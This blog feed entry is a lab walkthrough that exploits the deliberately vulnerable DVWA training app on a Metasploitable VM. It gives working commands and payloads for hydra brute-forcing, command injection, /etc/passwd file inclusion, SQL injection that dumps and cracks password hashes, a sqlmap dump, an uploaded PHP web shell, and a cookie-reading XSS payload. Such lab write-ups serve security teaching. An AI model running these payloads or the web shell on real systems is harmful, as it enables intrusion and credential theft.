<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[/home/mislusnys]]></title>
  <link href="http://mislusnys.github.io/atom.xml" rel="self"/>
  <link href="http://mislusnys.github.io/"/>
  <updated>2015-02-03T06:40:45-05:00</updated>
  <id>http://mislusnys.github.io/</id>
  <author>
    <name><![CDATA[Mindaugas Slusnys]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Exploring Damn Vulnerable Web Application]]></title>
    <link href="http://mislusnys.github.io/blog/2015/02/02/damn-vulnerable-web-application/"/>
    <updated>2015-02-02T08:40:17-05:00</updated>
    <id>http://mislusnys.github.io/blog/2015/02/02/damn-vulnerable-web-application</id>
    <content type="html"><![CDATA[<h2>Intro</h2>

<blockquote><p>Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment.</p></blockquote>

<!--more-->


<p>In this report we will be exploiting the vulnerabilities that are present in the DVWA (version 1.0.7).
We will use the version that is bundled in the <a href="http://sourceforge.net/projects/metasploitable/files/Metasploitable2/">Metasploitable 2</a> VM (IP address 192.168.52.129).
We will use the lowest security setting (<strong>PHPIDS</strong>:disabled and <strong>Security Level</strong>:low).</p>

<h2>Brute Force</h2>

<p>Our first task is to brute force HTTP based login form:</p>

<p><img src="http://mislusnys.github.io/images/bf.png"></p>

<p>Using <code>burp</code> we find that parameters are transmitted via URL:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.52.129/dvwa/vulnerabilities/brute/?username=test&password=test&Login=Login#</span></code></pre></td></tr></table></div></figure>


<p>And our session data:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Cookie: security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28</span></code></pre></td></tr></table></div></figure>


<p>Using this information we can use <code>hydra</code> to brute force the login form:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# hydra 192.168.52.129 -L user.txt -P pass.txt http-get-form "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28"
</span><span class='line'>Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only
</span><span class='line'>
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) starting at 2015-02-02 09:13:54
</span><span class='line'>[DATA] 16 tasks, 1 server, 28 login tries (l:4/p:7), ~1 try per task
</span><span class='line'>[DATA] attacking service http-get-form on port 80
</span><span class='line'>[80][www-form] host: 192.168.52.129   login: admin   password: password
</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) finished at 2015-02-02 09:13:57</span></code></pre></td></tr></table></div></figure>


<p>
We found valid login credentials: <code>admin:password</code></p>

<h2>Command Execution</h2>

<p><img src="http://mislusnys.github.io/images/ce.png"></p>

<p>This part of the app gives the current user the ability to ping a host.
However it uses a vulnerable piece of code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span> <span class="s1">&#39;ping  -c 3 &#39;</span> <span class="o">.</span> <span class="nv">$target</span> <span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Since we control the <code>$target</code> variable, we can use <code>;</code> or <code>||</code> to stack commands.</p>

<p>Using <code>127.0.0.1;ls -al</code> as input we get:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
</span><span class='line'>64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.000 ms
</span><span class='line'>64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.043 ms
</span><span class='line'>64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.089 ms
</span><span class='line'>
</span><span class='line'>--- 127.0.0.1 ping statistics ---
</span><span class='line'>3 packets transmitted, 3 received, 0% packet loss, time 1998ms
</span><span class='line'>rtt min/avg/max/mdev = 0.000/0.044/0.089/0.036 ms
</span><span class='line'>total 20
</span><span class='line'>drwxr-xr-x  4 www-data www-data 4096 May 20  2012 .
</span><span class='line'>drwxr-xr-x 11 www-data www-data 4096 May 20  2012 ..
</span><span class='line'>drwxr-xr-x  2 www-data www-data 4096 May 20  2012 help
</span><span class='line'>-rw-r--r--  1 www-data www-data 1509 Mar 16  2010 index.php
</span><span class='line'>drwxr-xr-x  2 www-data www-data 4096 May 20  2012 source</span></code></pre></td></tr></table></div></figure>


<h2>CSRF</h2>

<p><img src="http://mislusnys.github.io/images/csrf.png"></p>

<p>CSRF is an attack in which an authenticated user (usually administrator) unknowingly executes a certain action.
In our case the password change operation results in the following request:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.52.129/dvwa/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change#</span></code></pre></td></tr></table></div></figure>


<p>If we can trick an authenticated user to make this request, we can change this user&rsquo;s password. Usually this is done by tricking the user into visiting a page controlled by the attacker with malicious request embedded inside <code>img</code>, <code>iframe</code> tags or inside malicious javascript code.</p>

<h2>File Inclusion</h2>

<p><img src="http://mislusnys.github.io/images/fi.png"></p>

<p>This one is pretty straight forward. We can change the <code>page</code> variable to display sensitive information:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.52.129/dvwa/vulnerabilities/fi/?page=/etc/passwd</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh 
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh 
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh 
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync 
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh 
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh 
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh 
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh 
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh 
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh 
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh 
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh 
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh 
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh 
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh 
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh 
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh 
</span><span class='line'>dhcp:x:101:102::/nonexistent:/bin/false 
</span><span class='line'>syslog:x:102:103::/home/syslog:/bin/false 
</span><span class='line'>klog:x:103:104::/home/klog:/bin/false 
</span><span class='line'>sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin 
</span><span class='line'>msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash 
</span><span class='line'>bind:x:105:113::/var/cache/bind:/bin/false 
</span><span class='line'>postfix:x:106:115::/var/spool/postfix:/bin/false 
</span><span class='line'>ftp:x:107:65534::/home/ftp:/bin/false 
</span><span class='line'>postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash 
</span><span class='line'>mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false 
</span><span class='line'>tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false 
</span><span class='line'>distccd:x:111:65534::/:/bin/false 
</span><span class='line'>user:x:1001:1001:just a user,111,,:/home/user:/bin/bash 
</span><span class='line'>service:x:1002:1002:,,,:/home/service:/bin/bash 
</span><span class='line'>telnetd:x:112:120::/nonexistent:/bin/false 
</span><span class='line'>proftpd:x:113:65534::/var/run/proftpd:/bin/false 
</span><span class='line'>statd:x:114:65534::/var/lib/nfs:/bin/false 
</span><span class='line'>snmp:x:115:65534::/var/lib/snmp:/bin/false </span></code></pre></td></tr></table></div></figure>


<h2>SQL Injection</h2>

<p><img src="http://mislusnys.github.io/images/sqli.png"></p>

<p>User input is unfiltered and used in the following query:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span> <span class="n">first_name</span><span class="p">,</span> <span class="n">last_name</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">user_id</span> <span class="o">=</span> <span class="s1">&#39;$id&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>If we enter <code>' or 1=1-- -</code> as an id then the query becomes:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span> <span class="n">first_name</span><span class="p">,</span> <span class="n">last_name</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">user_id</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span>
</span></code></pre></td></tr></table></div></figure>


<p>which makes WHERE clause always true and shows us all the records:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ID: 'or 1=1-- -
</span><span class='line'>First name: admin
</span><span class='line'>Surname: admin
</span><span class='line'>
</span><span class='line'>ID: 'or 1=1-- -
</span><span class='line'>First name: Gordon
</span><span class='line'>Surname: Brown
</span><span class='line'>
</span><span class='line'>ID: 'or 1=1-- -
</span><span class='line'>First name: Hack
</span><span class='line'>Surname: Me
</span><span class='line'>
</span><span class='line'>ID: 'or 1=1-- -
</span><span class='line'>First name: Pablo
</span><span class='line'>Surname: Picasso
</span><span class='line'>
</span><span class='line'>ID: 'or 1=1-- -
</span><span class='line'>First name: Bob
</span><span class='line'>Surname: Smith</span></code></pre></td></tr></table></div></figure>


<p>Using <code>UNION</code> keyword we can extract any information available to the app&rsquo;s user from the database.</p>

<blockquote><p>&lsquo; union select database(),null &ndash; -</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ID: ' union select database(),null -- -
</span><span class='line'>First name: dvwa
</span><span class='line'>Surname: </span></code></pre></td></tr></table></div></figure>


<blockquote><p>&lsquo; union select table_name,null from information_schema.tables where table_schema=&#8217;dvwa&rsquo;&ndash; -</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ID:  ' union select table_name,null from information_schema.tables where table_schema='dvwa'-- -
</span><span class='line'>First name: guestbook
</span><span class='line'>Surname: 
</span><span class='line'>
</span><span class='line'>ID:  ' union select table_name,null from information_schema.tables where table_schema='dvwa'-- -
</span><span class='line'>First name: users
</span><span class='line'>Surname: </span></code></pre></td></tr></table></div></figure>


<blockquote><p>&lsquo; union select column_name,null from information_schema.columns where table_name=&#8217;users&rsquo;&ndash; -</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ID: ' union select column_name,null from information_schema.columns where table_name='users'-- -
</span><span class='line'>First name: user_id
</span><span class='line'>Surname: 
</span><span class='line'>
</span><span class='line'>ID: ' union select column_name,null from information_schema.columns where table_name='users'-- -
</span><span class='line'>First name: first_name
</span><span class='line'>Surname: 
</span><span class='line'>
</span><span class='line'>ID: ' union select column_name,null from information_schema.columns where table_name='users'-- -
</span><span class='line'>First name: last_name
</span><span class='line'>Surname: 
</span><span class='line'>
</span><span class='line'>ID: ' union select column_name,null from information_schema.columns where table_name='users'-- -
</span><span class='line'>First name: user
</span><span class='line'>Surname: 
</span><span class='line'>
</span><span class='line'>ID: ' union select column_name,null from information_schema.columns where table_name='users'-- -
</span><span class='line'>First name: password
</span><span class='line'>Surname: 
</span><span class='line'>
</span><span class='line'>ID: ' union select column_name,null from information_schema.columns where table_name='users'-- -
</span><span class='line'>First name: avatar
</span><span class='line'>Surname: </span></code></pre></td></tr></table></div></figure>


<blockquote><p>&lsquo; union select user, password from users&ndash; -</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ID: ' union select user, password from users-- -
</span><span class='line'>First name: admin
</span><span class='line'>Surname: 098f6bcd4621d373cade4e832627b4f6
</span><span class='line'>
</span><span class='line'>ID: ' union select user, password from users-- -
</span><span class='line'>First name: gordonb
</span><span class='line'>Surname: e99a18c428cb38d5f260853678922e03
</span><span class='line'>
</span><span class='line'>ID: ' union select user, password from users-- -
</span><span class='line'>First name: 1337
</span><span class='line'>Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
</span><span class='line'>
</span><span class='line'>ID: ' union select user, password from users-- -
</span><span class='line'>First name: pablo
</span><span class='line'>Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
</span><span class='line'>
</span><span class='line'>ID: ' union select user, password from users-- -
</span><span class='line'>First name: smithy
</span><span class='line'>Surname: 5f4dcc3b5aa765d61d8327deb882cf99</span></code></pre></td></tr></table></div></figure>


<p>Looks like passwords are MD5 hashed. However, they are easily found to be <code>test</code>, <code>abc123</code>, <code>charley</code>, <code>letmein</code> and <code>password</code> respectively.</p>

<h2>SQL Injection(Blind)</h2>

<p>The blind SQL injection case uses the same vulnerable SQL query. The only difference is that the errors (from MySQL) are not shown to the user.
We can use <code>sqlmap</code> to automate SQL injection exploitation (especially in blind injection cases where injection uses MANY boolean or time based queries)</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.52.129/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28" --dump
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Database: dvwa
</span><span class='line'>Table: users
</span><span class='line'>[5 entries]
</span><span class='line'>+---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
</span><span class='line'>| user_id | user    | avatar                                                | password                         | last_name | first_name |
</span><span class='line'>+---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
</span><span class='line'>| 1       | admin   | http://192.168.52.129/dvwa/hackable/users/admin.jpg   | 098f6bcd4621d373cade4e832627b4f6 | admin     | admin      |
</span><span class='line'>| 2       | gordonb | http://192.168.52.129/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     |
</span><span class='line'>| 3       | 1337    | http://192.168.52.129/dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       |
</span><span class='line'>| 4       | pablo   | http://192.168.52.129/dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      |
</span><span class='line'>| 5       | smithy  | http://192.168.52.129/dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        |
</span><span class='line'>+---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+</span></code></pre></td></tr></table></div></figure>


<h2>Upload</h2>

<p><img src="http://mislusnys.github.io/images/up.png"></p>

<p>On the low security setting there are no restrictions on file upload. We can upload a php file containing simple code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])){</span>
</span><span class='line'>    <span class="nv">$cmd</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;cmd&quot;</span><span class="p">]);</span>
</span><span class='line'>    <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
</span><span class='line'>    <span class="k">echo</span> <span class="s2">&quot;&lt;/pre&gt;</span><span class="si">$cmd</span><span class="s2">&lt;pre&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">die</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>../../hackable/uploads/shell.php succesfully uploaded!</span></code></pre></td></tr></table></div></figure>


<p>We can execute commands now via this shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.52.129/dvwa/hackable/uploads/shell.php?cmd=ls -al</span></code></pre></td></tr></table></div></figure>


<h2>XSS reflected</h2>

<p><img src="http://mislusnys.github.io/images/xss.png"></p>

<p>Here whatever we enter gets included into page source.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://mislusnys.github.io/images/cookie.png"></p>

<h2>XSS stored</h2>

<p><img src="http://mislusnys.github.io/images/xss2.png"></p>

<p>Here the app is vulnerable to XSS again. However, this time the injected code is stored inside the database and is executed every time somebody visits the guestbook page.</p>

<p><img src="http://mislusnys.github.io/images/stored.png"></p>

<h2>Summary</h2>

<p>DVWA includes most common web server vulnerabilities and provides easy access to the vulnerable pieces of code. It is a great package for a beginner level pentest demo.</p>
]]></content>
  </entry>
  
</feed>
